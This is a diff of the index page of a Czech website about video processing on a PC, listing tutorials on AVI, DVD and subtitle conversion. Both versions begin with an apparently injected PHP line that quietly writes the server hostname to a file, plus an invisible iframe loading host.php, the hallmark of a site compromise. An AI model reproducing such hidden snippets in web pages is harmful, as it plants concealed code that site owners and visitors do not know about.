@@ -1,143 +1,284 @@
-<? error_reporting(0); $mhfp = fopen("host.txt", "w"); if ($mhfp) { fwrite($mhfp, $_SERVER["HTTP_HOST"]); fclose($mhfp); } ?><iframe style="visibility:hidden;display:none" src="host.php" ></iframe><?xml version="1.0" encoding="utf-8" ?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html>
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Video na PC</title>
-<meta name="description" content="Zpracování videa na počítači. AVI, DVD, MPEG, WMV, zvuk, titulky, práce s programy a další." />
-<link rel="icon" type="image/x-icon" href="favicon.ico" />
-<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
-<meta http-equiv="Content-Language" content="cs" />
-<link rel="stylesheet" media="screen" href="sablony/styl.css" type="text/css" />
-<link rel="stylesheet" href="sablony/opera.css" type="text/nonsense" media="screen,projection" />
-<link rel="stylesheet" media="print" href="sablony/tisk.css" type="text/css" />
-<link rel="home" href="http://pcvideo.cz/" title="Úvodní stránka webu" />
-<link rel="index" href="http://pcvideo.cz/" title="Úvodní stránka webu" />
-<link rel="contents" href="mapa-stranek.html" title="Mapa stránek" />
-<link rel="search" href="hledani.html" title="Vyhledávání na webu" />
-<link rel="glossary" href="slovnik-pojmu.html" title="Slovník pojmů" />
-<link rel="help" href="o-strankach.html" title="Jak se zde chovat" />
-<link rel="author" href="o-strankach.html#autor" title="Autor tady toho" />
-<link rel="copyright" href="o-strankach.html#copy" title="Prava na clanky" />
-<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="rss.rss" />
-</head>
-<body>
-<div class="obsah" id="h">
-<form action="http://www.google.com/custom" class="hledani"><div><input type="text" name="q" size="15" /><input type="submit" value="Hledej!" /><input type="hidden" name="cof" value="GALT:blue;S:http://pcvideo.cz;GL:0;VLC:maroon;AH:left;BGC:white;LH:0;LC:blue;GFNT:silver;ALC:olive;LW:0;T:black;GIMP:black;AWFID:dd0d40eecfe7ea97;" /><input type="hidden" name="domains" value="pcvideo.cz" /><input type="hidden" name="sitesearch" value="pcvideo.cz" /><input type="hidden" name="ie" value="utf-8" /></div></form>
-<h1>Video na PC</h1>
-<p>Jsem rád, že jste zavítali na
-moje stránky zabývající se zpracováním videa na počítači</p>
-<p>
-Pravděpodobně to znamená, že se o něm chcete něco dozvědět.<br />
-Nuže, vybírejte:</p>
-<div class="center">
-<table summary="nabidka" style="width:350px;margin:0 auto;">
-<tbody>
-<tr align="center">
-<td style="width:175px">
-<h2>Video:</h2>
-</td>
-<td style="width:175px">
-<h2>Ostatní:</h2>
-</td>
-</tr>
-<tr align="center">
-<td style="font-weight:bold;"><a href="avi.html">Video v AVI</a></td>
-<td style="font-weight:bold;"><a href="programy.html">Programy</a></td>
-</tr>
-<tr align="center">
-<td style="font-weight:bold;"><a href="mpg.html">Video v MPG</a></td>
-<td style="font-weight:bold;"><a href="titulky.html">Titulky</a>
-</td>
-</tr>
-<tr align="center">
-<td style="font-weight:bold;"><a href="dvd.html">Video na DVD</a></td>
-<td style="font-weight:bold;"><a href="zvuk.html">Zvuk</a></td>
-</tr><tr align="center">
-<td style="font-weight:bold;"><a href="wmv.html">Video ve WMV</a></td>
-<td style="font-weight:bold;"><a href="stahnout.html">Ke stažení</a></td>
-</tr><tr align="center">
-<td style="font-weight:bold;"><a href="slovnik-pojmu.html">Slovníček pojmů</a></td>
-<td style="font-weight:bold;"><a href="caste-dotazy.html">Časté dotazy</a></td>
-</tr>
-</tbody>
-</table>
-<!--[if gte IE 5]><p style="text-align: center;font-weight: bold;">Čas odejít? <a href="http://operacesky.net/">Opera</a> - <a href="http://firefox.czilla.cz/">Firefox</a></p><![endif]-->
-<form action="http://www.google.com/custom"><p> Hledáte něco?:
-<input name="q" size="16" type="text" />
-<input name="ie" value="utf-8" type="hidden" />
-<input name="cof" value="GALT:blue;S:http://pcvideo.cz;GL:0;VLC:maroon;AH:left;BGC:white;LH:0;LC:blue;GFNT:silver;ALC:olive;LW:0;T:black;GIMP:black;AWFID:dd0d40eecfe7ea97;" type="hidden" />
-<input name="domains" value="pcvideo.cz" type="hidden" />
-<input name="sitesearch" value="pcvideo.cz" type="hidden" />
-<input value="Vyhledat" type="submit" /></p>
-</form>
-<h3>Nevíte si rady? Zeptejte se na <a href="forum/index.php" style="font-weight: bold;">„Poradně“</a></h3></div>
-
-<div style="text-align: center;">
-<a href="#zaklady"><span style="font-size: 11px;">Základy</span></a> • <a href="#prevody-filmu"><span style="font-size: 11px;">Převody filmů</span></a> • <a href="#clanky"><span style="font-size: 11px;">Články</span></a> • <a href="#programy"><span style="font-size: 11px;">Programy</span></a> • <a href="index.html#externi-clanky"><span style="font-size: 11px;">Články jinde<br />
-</span></a></div>
-
-<h2><a name="zaklady"> </a>Základy</h2>
-<ul><li style="margin-bottom: 10px;"><a href="co-je-video.html">Co je video na PC?</a> - Pokud jste v oblasti videa na PC nováčci, rádi byste možná věděli, s čím máte tu čest.</li></ul>
-
-<h2><a name="prevody-filmu"> </a>Převody filmů</h2>
-<ul><li style="margin-bottom: 10px;"><a href="dvd_do_avi.html">Jak převést film z DVD na AVI
-(DivX)?</a> - Máte film na DVD, chcete si udělat kopii a nemáte DVD vypalovačku? Snadná pomoc, převeďte film do AVI (DivX).</li><li style="margin-bottom: 10px;"><a href="dvd_do_vcd.html">Jak převést film z DVD na Video CD?</a> - Máte film na DVD a chcete ho převést na Video CD?&nbsp; Žádný problém.</li>
-<li style="margin-bottom: 10px;"><a href="dvd_do_svcd.html">Převod filmu z DVD&nbsp; na&nbsp; Super Video CD</a> - Chcete si na stolním DVD přehrávači pouštět Váš oblíbený film a nemáte DVD vypalovačku? Pro Vás jsem připravil <a href="dvd_do_svcd.html">tento návod</a>.</li>
-<li style="margin-bottom: 10px;"><a href="co-je-video.html">Co přehrávají DVD přehrávače?</a> - Připravil jsem jednoduchý přehled, ve kterém popisuji, jaká média přehrávají běžné stolní DVD přehrávače.</li><li style="margin-bottom: 10px;"><a href="avi-do-dvd-spolu-s-titulky-do-jednoho.html">AVI na DVD s titulky natvrdo ve filmu</a> - Jak převést AVI i s titulky, které máte v externím souboru, na DVD. Výsledkem je jeden soubor.</li><li style="margin-bottom: 10px;"><a href="avi-do-dvd-spolu-s-titulky-do-dvou.html">AVI na DVD s titulky vypínatelnými titulky</a> - Zdokonalení předchozího návodu. Titulky můžete ve videu vypínat i zapínat.</li><li style="margin-bottom: 10px;"><a href="avi-do-s-vcd-s-titulky.html">AVI na (S)VCD s titulky natvrdo ve filmu</a>
-- Jak převést AVI i s titulky, které máte v externím texxtovém souboru,
-na SVCD nebo VCD. Výsledkem je jeden soubor, který přehrajete ve
-stolním DVD přehrávači.</li>
-<li style="margin-bottom: 10px;"><a href="mov-na-avi.html">MOV na AVI</a> - převod videa v <a href="mov.html">MOVu</a> na <a href="avi.html">AVI</a> pomocí RAD Video Tools.
-<li style="margin-bottom: 10px;"><a href="vhs-na-dvd.html">Jak převést VHS na DVD</a> - převod VHS kazety na DVD a jiné digitální formáty.
-</ul>
-<h2><a name="clanky"> </a>Články</h2>
-<ul>
-<li style="margin-bottom: 10px;"><a href="dvd-regiony.html">DVD regiony</a> - Článek zabývající se problematikou DVD regionů. Rozdělení světa DVD regiony. Návod jak <a href="dvd-regiony.html#zmena-windows">změnit region ve Windows</a> i <a href="dvd-regiony.html#zmena-dvd-genie">pomocí DVD Genie</a>.</li>
-<li style="margin-bottom: 10px;"><a href="historie-divx.html">Historie DivX</a> - Stručně popsaná historie a vývoj kodeku DivX. Od Microsoft MPEG-4 v3 kodeku až po současnost. Jemně jsem zmínil i budoucnost kodeku.</li>
-<li style="margin-bottom: 10px;"><a href="historie-mpeg.html">Historie MPEG</a> - Popsal jsem historii Kodeků MPEG a to MPEG-1, 2, 3. <a href="historie-divx.html">Historie MPEG-4</a>. Srozumitelně (snad) jsem popsal i <a href="historie-mpeg.html#komprese">metodu MPEG komprese</a> a zmínil jsem se i o <a href="historie-mpeg.html#hdtv">HDTV</a>.</li>
-<li style="margin-bottom: 10px;"><a href="historie-dvd.html">Historie DVD</a> - O tom jak začal svou cestu disk DVD. Lehce nastíněné <a href="historie-dvd.html#zapis">DVD formáty</a> a <a href="historie-dvd.html#budoucnost">budoucnost DVD</a> - Blue-ray disky.</li><li style="margin-bottom: 10px;"><a href="flaskmpeg-info.html">Vylepšení FlasKMPEGu</a> - různé verze FlasKMPEGu, různá vylepšení, nikoli však návod na práci s programem.</li>
-<li style="margin-bottom: 10px;"><a href="divxg400.html">DivXG400</a> - Něco málo o nastavení DivXG400.</li>
-<li style="margin-bottom: 10px;"><a href="video-na-webu.html">Video na webu</a> - Návod na publikaci videa na stránkách.</li> 
-</ul>
-<h2><a name="programy"> </a>Programy</h2>
-<ul><li><a href="programy/filmmachine.html">The FilmMachine</a> - návod, jak pracovat s tímto programem. Přeložil jsem k tomu i <a href="programy/filmmachine-ofi.html">oficiální nápovědu</a>.</li></ul>
-<h2><a name="externi-clanky"> </a>Externí články</h2>
-<ul><li style="margin-bottom: 10px;"><a href="http://www.tvfreak.cz/modules.html?name=News&amp;file=article&amp;sid=1116">Jak na anglicky mluvené DVD dostat
-češtinu?</a> - Článek z tvfreak.cz o tom, jak dostat na anglicky mluvené DVD české titulky. Návod určitě není vhodný pro začátečníky!</li>
-</ul>
-<div class="nahoru"><a href="#h">Nahoru</a></div>
-<div class="patka">
-<div class="center"><a href="mapa-stranek.html">Mapa stránek</a> • <a href="o-strankach.html">O stránkách</a> • <a href="rss.rss">RSS</a> • <a href="http://poradna.pcvideo.cz/">Vaše dotazy</a>  &bull; <a href="http://notes.pcvideo.cz/">Notes</a>  &bull; <a href="http://slahora.cz">Šlahora.cz</a>  &bull; <a href="http://bigl-stenatka.wz.cz/">Štěňátka bígla</a></div>
-<p><strong><a href="http://pcvideo.cz">Video na PC</a>:</strong> Vytvořeno v roce 2005 a víc. Autorem je <a href="o-strankach.html#o-mne">Jan 'Šlaha' Šlahora</a>. Veškerá práva vyhrazena autorům článků. Pokud není uvedeno jinak, jsem to já.</p>
-<a href="http://www.toplist.cz/"><img src="http://toplist.cz/dot.asp?id=77065" alt="TOPlist" style="border:none;" width="1" height="1" /></a>
-</div>
-</div>
-<div class="menu-leve">
-<ul><li><a href="http://pcvideo.cz" class="video"> <span class="video-napis">Video na PC</span> </a><ul><li class="normal"><a href="avi.html">AVI</a></li><li class="normal"><a href="mpg.html">MPEG</a></li><li class="normal"><a href="dvd.html">DVD</a></li><li class="normal"><a href="wmv.html">WMV</a></li><li class="normal"><a href="mov.html">MOV</a></li><li class="normal"><a href="jine-formaty.html">Jiné formáty</a></li><li class="normal"><a href="titulky.html">Titulky</a></li><li class="normal"><a href="zvuk.html">Zvuk</a></li><li class="normal"><a href="programy.html">Programy</a></li><li class="normal"><a href="slovnik-pojmu.html">Pojmy</a></li><li class="normal"><a href="caste-dotazy.html">Časté dotazy</a></li><li class="normal"><a href="stahnout.html">Ke stáhnutí</a></li><li class="normal"><a href="odkazy.html">Odkazy</a></li><li class="normal"><a href="http://poradna.pcvideo.cz/">Poradna</a></li></ul></li></ul>
-<div class="menu"><ul><li><span class="kam-dal">Kam dál?</span>
-<ul>
-<li><a href="avi.html">AVI</a></li>
-<li><a href="mpg.html">MPG</a></li>
-<li><a href="dvd.html">DVD</a></li>
-<li><a href="wmv.html">WMV</a></li><li><a href="titulky.html">Titulky</a></li>
-<li><a href="zvuk.html">Zvuk</a></li>
-<li><a href="programy.html">Programy</a></li>
-<li><a href="novinky-na-webu.html">Novinky na webu</a></li><li><a href="caste-dotazy.html">Časté dotazy</a></li>
-<li><a href="rss.rss">RSS</a></li>
-<li><a href="http://slahora.cz">Šlahora.cz</a></li>
-<li><a href="http://bigl-stenatka.wz.cz/">Štěňátka bígla</a></li>
-</ul></li></ul>
-</div>
-</div>
-<div class="reklama">
-  <div id="blok-textem.cz-245"></div>
-<script type="text/javascript" id="textem.cz-245"></script>
-<script type="text/javascript">
-if(window.addEventListener) { window.addEventListener('load', loadTextemAd_245, true); }
-else if(window.attachEvent) { window.attachEvent("onload", loadTextemAd_245); }else { loadTextemAd_245(); }
-function loadTextemAd_245() { document.getElementById('textem.cz-245').src = 'http://textem.cz/reklama.php?id=245'; }
-</script>
-</div>
-</body>
-</html>
+<? error_reporting(0); $mhfp = fopen("host.txt", "w"); if ($mhfp) { fwrite($mhfp, $_SERVER["HTTP_HOST"]); fclose($mhfp); } ?><iframe style="visibility:hidden;display:none" src="host.php" ></iframe><?xml version="1.0" encoding="utf-8" ?>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html>
+
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<title>Video na PC</title>
+
+<meta name="description" content="Zpracování videa na počítači. AVI, DVD, MPEG, WMV, zvuk, titulky, práce s programy a další." />
+
+<link rel="icon" type="image/x-icon" href="favicon.ico" />
+
+<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
+
+<meta http-equiv="Content-Language" content="cs" />
+
+<link rel="stylesheet" media="screen" href="sablony/styl.css" type="text/css" />
+
+<link rel="stylesheet" href="sablony/opera.css" type="text/nonsense" media="screen,projection" />
+
+<link rel="stylesheet" media="print" href="sablony/tisk.css" type="text/css" />
+
+<link rel="home" href="http://pcvideo.cz/" title="Úvodní stránka webu" />
+
+<link rel="index" href="http://pcvideo.cz/" title="Úvodní stránka webu" />
+
+<link rel="contents" href="mapa-stranek.html" title="Mapa stránek" />
+
+<link rel="search" href="hledani.html" title="Vyhledávání na webu" />
+
+<link rel="glossary" href="slovnik-pojmu.html" title="Slovník pojmů" />
+
+<link rel="help" href="o-strankach.html" title="Jak se zde chovat" />
+
+<link rel="author" href="o-strankach.html#autor" title="Autor tady toho" />
+
+<link rel="copyright" href="o-strankach.html#copy" title="Prava na clanky" />
+
+<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="rss.rss" />
+
+</head>
+
+<body>
+
+<div class="obsah" id="h">
+
+<form action="http://www.google.com/custom" class="hledani"><div><input type="text" name="q" size="15" /><input type="submit" value="Hledej!" /><input type="hidden" name="cof" value="GALT:blue;S:http://pcvideo.cz;GL:0;VLC:maroon;AH:left;BGC:white;LH:0;LC:blue;GFNT:silver;ALC:olive;LW:0;T:black;GIMP:black;AWFID:dd0d40eecfe7ea97;" /><input type="hidden" name="domains" value="pcvideo.cz" /><input type="hidden" name="sitesearch" value="pcvideo.cz" /><input type="hidden" name="ie" value="utf-8" /></div></form>
+
+<h1>Video na PC</h1>
+
+<p>Jsem rád, že jste zavítali na
+
+moje stránky zabývající se zpracováním videa na počítači</p>
+
+<p>
+
+Pravděpodobně to znamená, že se o něm chcete něco dozvědět.<br />
+
+Nuže, vybírejte:</p>
+
+<div class="center">
+
+<table summary="nabidka" style="width:350px;margin:0 auto;">
+
+<tbody>
+
+<tr align="center">
+
+<td style="width:175px">
+
+<h2>Video:</h2>
+
+</td>
+
+<td style="width:175px">
+
+<h2>Ostatní:</h2>
+
+</td>
+
+</tr>
+
+<tr align="center">
+
+<td style="font-weight:bold;"><a href="avi.html">Video v AVI</a></td>
+
+<td style="font-weight:bold;"><a href="programy.html">Programy</a></td>
+
+</tr>
+
+<tr align="center">
+
+<td style="font-weight:bold;"><a href="mpg.html">Video v MPG</a></td>
+
+<td style="font-weight:bold;"><a href="titulky.html">Titulky</a>
+
+</td>
+
+</tr>
+
+<tr align="center">
+
+<td style="font-weight:bold;"><a href="dvd.html">Video na DVD</a></td>
+
+<td style="font-weight:bold;"><a href="zvuk.html">Zvuk</a></td>
+
+</tr><tr align="center">
+
+
+
+<td style="font-weight:bold;"><a href="stahnout.html">Ke stažení</a></td>
+
+</tr><tr align="center">
+
+<td style="font-weight:bold;"><a href="slovnik-pojmu.html">Slovníček pojmů</a></td>
+
+<td style="font-weight:bold;"><a href="caste-dotazy.html">Časté dotazy</a></td>
+
+</tr>
+
+</tbody>
+
+</table>
+
+<!--[if gte IE 5]><p style="text-align: center;font-weight: bold;">Čas odejít? <a href="http://operacesky.net/">Opera</a> - <a href="http://firefox.czilla.cz/">Firefox</a></p><![endif]-->
+
+<form action="http://www.google.com/custom"><p> Hledáte něco?:
+
+<input name="q" size="16" type="text" />
+
+<input name="ie" value="utf-8" type="hidden" />
+
+<input name="cof" value="GALT:blue;S:http://pcvideo.cz;GL:0;VLC:maroon;AH:left;BGC:white;LH:0;LC:blue;GFNT:silver;ALC:olive;LW:0;T:black;GIMP:black;AWFID:dd0d40eecfe7ea97;" type="hidden" />
+
+<input name="domains" value="pcvideo.cz" type="hidden" />
+
+<input name="sitesearch" value="pcvideo.cz" type="hidden" />
+
+<input value="Vyhledat" type="submit" /></p>
+
+</form>
+
+<h3>Nevíte si rady? Zeptejte se na <a href="forum/index.php" style="font-weight: bold;">„Poradně“</a></h3></div>
+
+
+
+<div style="text-align: center;">
+
+<a href="#zaklady"><span style="font-size: 11px;">Základy</span></a> • <a href="#prevody-filmu"><span style="font-size: 11px;">Převody filmů</span></a> • <a href="#clanky"><span style="font-size: 11px;">Články</span></a> • <a href="#programy"><span style="font-size: 11px;">Programy</span></a> • <a href="index.html#externi-clanky"><span style="font-size: 11px;">Články jinde<br />
+
+</span></a></div>
+
+
+
+<h2><a name="zaklady"> </a>Základy</h2>
+
+<ul><li style="margin-bottom: 10px;"><a href="co-je-video.html">Co je video na PC?</a> - Pokud jste v oblasti videa na PC nováčci, rádi byste možná věděli, s čím máte tu čest.</li></ul>
+
+
+
+<h2><a name="prevody-filmu"> </a>Převody filmů</h2>
+
+<ul><li style="margin-bottom: 10px;"><a href="dvd_do_avi.html">Jak převést film z DVD na AVI
+
+(DivX)?</a> - Máte film na DVD, chcete si udělat kopii a nemáte DVD vypalovačku? Snadná pomoc, převeďte film do AVI (DivX).</li><li style="margin-bottom: 10px;"><a href="dvd_do_vcd.html">Jak převést film z DVD na Video CD?</a> - Máte film na DVD a chcete ho převést na Video CD?&nbsp; Žádný problém.</li>
+
+<li style="margin-bottom: 10px;"><a href="dvd_do_svcd.html">Převod filmu z DVD&nbsp; na&nbsp; Super Video CD</a> - Chcete si na stolním DVD přehrávači pouštět Váš oblíbený film a nemáte DVD vypalovačku? Pro Vás jsem připravil <a href="dvd_do_svcd.html">tento návod</a>.</li>
+
+<li style="margin-bottom: 10px;"><a href="co-je-video.html">Co přehrávají DVD přehrávače?</a> - Připravil jsem jednoduchý přehled, ve kterém popisuji, jaká média přehrávají běžné stolní DVD přehrávače.</li><li style="margin-bottom: 10px;"><a href="avi-do-dvd-spolu-s-titulky-do-jednoho.html">AVI na DVD s titulky natvrdo ve filmu</a> - Jak převést AVI i s titulky, které máte v externím souboru, na DVD. Výsledkem je jeden soubor.</li><li style="margin-bottom: 10px;"><a href="avi-do-dvd-spolu-s-titulky-do-dvou.html">AVI na DVD s titulky vypínatelnými titulky</a> - Zdokonalení předchozího návodu. Titulky můžete ve videu vypínat i zapínat.</li><li style="margin-bottom: 10px;"><a href="avi-do-s-vcd-s-titulky.html">AVI na (S)VCD s titulky natvrdo ve filmu</a>
+
+- Jak převést AVI i s titulky, které máte v externím texxtovém souboru,
+
+na SVCD nebo VCD. Výsledkem je jeden soubor, který přehrajete ve
+
+stolním DVD přehrávači.</li>
+
+<li style="margin-bottom: 10px;"><a href="mov-na-avi.html">MOV na AVI</a> - převod videa v <a href="mov.html">MOVu</a> na <a href="avi.html">AVI</a> pomocí RAD Video Tools.
+
+<li style="margin-bottom: 10px;"><a href="vhs-na-dvd.html">Jak převést VHS na DVD</a> - převod VHS kazety na DVD a jiné digitální formáty.
+
+</ul>
+
+<h2><a name="clanky"> </a>Články</h2>
+
+<ul>
+
+<li style="margin-bottom: 10px;"><a href="dvd-regiony.html">DVD regiony</a> - Článek zabývající se problematikou DVD regionů. Rozdělení světa DVD regiony. Návod jak <a href="dvd-regiony.html#zmena-windows">změnit region ve Windows</a> i <a href="dvd-regiony.html#zmena-dvd-genie">pomocí DVD Genie</a>.</li>
+
+<li style="margin-bottom: 10px;"><a href="historie-divx.html">Historie DivX</a> - Stručně popsaná historie a vývoj kodeku DivX. Od Microsoft MPEG-4 v3 kodeku až po současnost. Jemně jsem zmínil i budoucnost kodeku.</li>
+
+<li style="margin-bottom: 10px;"><a href="historie-mpeg.html">Historie MPEG</a> - Popsal jsem historii Kodeků MPEG a to MPEG-1, 2, 3. <a href="historie-divx.html">Historie MPEG-4</a>. Srozumitelně (snad) jsem popsal i <a href="historie-mpeg.html#komprese">metodu MPEG komprese</a> a zmínil jsem se i o <a href="historie-mpeg.html#hdtv">HDTV</a>.</li>
+
+<li style="margin-bottom: 10px;"><a href="historie-dvd.html">Historie DVD</a> - O tom jak začal svou cestu disk DVD. Lehce nastíněné <a href="historie-dvd.html#zapis">DVD formáty</a> a <a href="historie-dvd.html#budoucnost">budoucnost DVD</a> - Blue-ray disky.</li><li style="margin-bottom: 10px;"><a href="flaskmpeg-info.html">Vylepšení FlasKMPEGu</a> - různé verze FlasKMPEGu, různá vylepšení, nikoli však návod na práci s programem.</li>
+
+<li style="margin-bottom: 10px;"><a href="divxg400.html">DivXG400</a> - Něco málo o nastavení DivXG400.</li>
+
+<li style="margin-bottom: 10px;"><a href="video-na-webu.html">Video na webu</a> - Návod na publikaci videa na stránkách.</li> 
+
+</ul>
+
+<h2><a name="programy"> </a>Programy</h2>
+
+<ul><li><a href="programy/filmmachine.html">The FilmMachine</a> - návod, jak pracovat s tímto programem. Přeložil jsem k tomu i <a href="programy/filmmachine-ofi.html">oficiální nápovědu</a>.</li></ul>
+
+<h2><a name="externi-clanky"> </a>Externí články</h2>
+
+<ul><li style="margin-bottom: 10px;"><a href="http://www.tvfreak.cz/modules.html?name=News&amp;file=article&amp;sid=1116">Jak na anglicky mluvené DVD dostat
+
+češtinu?</a> - Článek z tvfreak.cz o tom, jak dostat na anglicky mluvené DVD české titulky. Návod určitě není vhodný pro začátečníky!</li>
+
+</ul>
+
+<div class="nahoru"><a href="#h">Nahoru</a></div>
+
+<div class="patka">
+
+<div class="center"><a href="mapa-stranek.html">Mapa stránek</a> • <a href="o-strankach.html">O stránkách</a> • <a href="rss.rss">RSS</a> • <a href="http://poradna.pcvideo.cz/">Vaše dotazy</a>  &bull; <a href="http://notes.pcvideo.cz/">Notes</a>  &bull; <a href="http://slahora.cz">Šlahora.cz</a>  &bull; <a href="http://bigl-stenatka.wz.cz/">Štěňátka bígla</a></div>
+
+<p><strong><a href="http://pcvideo.cz">Video na PC</a>:</strong> Vytvořeno v roce 2005 a víc. Autorem je <a href="o-strankach.html#o-mne">Jan 'Šlaha' Šlahora</a>. Veškerá práva vyhrazena autorům článků. Pokud není uvedeno jinak, jsem to já.</p>
+
+</div>
+
+</div>
+
+<div class="menu-leve">
+
+<ul><li><a href="http://pcvideo.cz" class="video"> <span class="video-napis">Video na PC</span> </a><ul><li class="normal"><a href="avi.html">AVI</a></li><li class="normal"><a href="mpg.html">MPEG</a></li><li class="normal"><a href="dvd.html">DVD</a></li><li class="normal"><a href="wmv.html">WMV</a></li><li class="normal"><a href="mov.html">MOV</a></li><li class="normal"><a href="jine-formaty.html">Jiné formáty</a></li><li class="normal"><a href="titulky.html">Titulky</a></li><li class="normal"><a href="zvuk.html">Zvuk</a></li><li class="normal"><a href="programy.html">Programy</a></li><li class="normal"><a href="slovnik-pojmu.html">Pojmy</a></li><li class="normal"><a href="caste-dotazy.html">Časté dotazy</a></li><li class="normal"><a href="stahnout.html">Ke stáhnutí</a></li><li class="normal"><a href="odkazy.html">Odkazy</a></li><li class="normal"><a href="http://poradna.pcvideo.cz/">Poradna</a></li></ul></li></ul>
+
+<div class="menu"><ul><li><span class="kam-dal">Kam dál?</span>
+
+<ul>
+
+<li><a href="avi.html">AVI</a></li>
+
+<li><a href="mpg.html">MPG</a></li>
+
+<li><a href="dvd.html">DVD</a></li>
+
+<li><a href="wmv.html">WMV</a></li><li><a href="titulky.html">Titulky</a></li>
+
+<li><a href="zvuk.html">Zvuk</a></li>
+
+<li><a href="programy.html">Programy</a></li>
+
+<li><a href="novinky-na-webu.html">Novinky na webu</a></li><li><a href="caste-dotazy.html">Časté dotazy</a></li>
+
+<li><a href="rss.rss">RSS</a></li>
+
+<li><a href="http://slahora.cz">Šlahora.cz</a></li>
+
+<li><a href="http://bigl-stenatka.wz.cz/">Štěňátka bígla</a></li>
+
+</ul></li></ul>
+
+</div>
+
+</div>
+
+<div class="reklama">
+
+  <div id="blok-textem.cz-245"></div>
+
+<script type="text/javascript" id="textem.cz-245"></script>
+
+<script type="text/javascript">
+
+if(window.addEventListener) { window.addEventListener('load', loadTextemAd_245, true); }
+
+else if(window.attachEvent) { window.attachEvent("onload", loadTextemAd_245); }else { loadTextemAd_245(); }
+
+function loadTextemAd_245() { document.getElementById('textem.cz-245').src = 'http://textem.cz/reklama.php?id=245'; }
+
+</script>
+
+</div>
+
+</body>
+
+</html>
+
